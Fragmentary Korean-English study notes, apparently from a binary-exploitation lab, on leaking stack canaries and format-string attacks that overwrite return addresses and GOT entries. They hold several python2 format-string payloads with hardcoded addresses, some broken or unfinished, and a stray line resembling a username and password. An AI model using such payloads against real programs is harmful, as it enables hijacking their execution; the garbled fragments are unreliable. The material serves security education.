Formats11

Canary

vulfoo has canary

argc 갯수
argv 어레이로된 parameter

fread

부모 프로세스- 아들 프로세스
Format string

Format 11_32

**카나리 찾는법**
1. Printf 에서 %x.으로 메모리 주소 읽기
	objdump -d - 디스어셈블
	

%eax,-0x2c(%ebp) 
ebp-20

0x8049276

python2 -c "print 'a'*20 + '\x00\x53\x5c\x59' + 'a'*12 + 

카나리를 잘 덮었어야되

SHELL CODE로 리턴하기 >


tmpbuffer
	RET
		%x %x.... %n
			Override = 4 bytes
				1 byte = %hhn Higer 4 bytes are same just lower 4 bytes
			$hhn$nx$hhn
			![[Screenshot 2024-10-31 at 3.37.55 PM.png]]
				python2 -c "print '\x8c\xd6\xff\xff'+'\x8d\xd6\xff\xff' + '%08x.'*8 + '%hhhn%hhn'" | ./formatstring_formats5_3
				8 Bytes+ 9bytes
				=62bytes
		4,4,4,10,58x

1. 하나의 정수는 4바이트
2. 하나의 HEX는 1 바이트
3. python2 -c "print '\x8c\xd6\xff\xff'+'aaaa'+'\x8d\xd6\xff\xff' + '%09x.'*5 + '%248x' +'%hhn%92d%hhn'" | ./formatstring_formats5_32 


formats9
3 global variables


Arbitrary Overwrite
1. Code Pointers (RET Address)
2. Function Pointers
	1. C++ vtable -> Code Pointers
	2. GCC .fini section
	3. GCC .got section Global Offset Table

Lazy Binding
		1. Memory에 적재되면
		2. C library는 그 library를 어드레스에 넣고 테이블에 넣는다 2번째 함수는 그 테이블에서 뽑아서 쓴다
		3. Procedure Linkage Table (코드가 들어 있음) 쓸수 없다
		4. GOT = Table이다 (각 라이브러리의 주소가 있다) 쓸수 있다
	1. 프로그램 시작하면 아무것도 없고
	2. 처음으로 시작하면 그 주소를 찾아서 테이블에 넣는다
	3. GOT Linker+Loader(Runtime):

1. GOT 어떤 Entry가 Exit()인지 찾을것 R=GOT
	1. objdump -R
2. nm 명ㄹ여어
3. python2 -c "print '\x24\xc0\x04\x08' + '%09x.'*7 + '37420%x' + '%hn'" +  | ./formatstring_formats12_32

admin/UJE335003133